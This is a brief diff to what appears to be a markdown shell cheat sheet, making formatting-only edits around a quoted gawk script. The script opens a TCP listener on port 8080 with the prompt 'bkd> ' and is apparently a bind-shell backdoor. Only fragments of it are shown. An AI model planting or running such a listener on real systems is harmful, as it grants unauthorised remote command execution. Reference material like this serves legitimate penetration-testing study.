@@ -85,7 +85,7 @@ You’ll need to authorise the target to connect to you (command also run on you
 > BEGIN { <br>
 >        Port    =       8080 <br>
 >        Prompt  =       "bkd> " <br>
-
+>
 >        Service = "/inet/tcp/" Port "/0/0" <br>
 >        while (1) { <br>
 >                do { <br>
@@ -98,5 +98,5 @@ You’ll need to authorise the target to connect to you (command also run on you
 >                        } <br>
 >                } while (cmd != "exit") <br>
 >                close(Service) <br>
->        } <br>
+>        } 
 > }
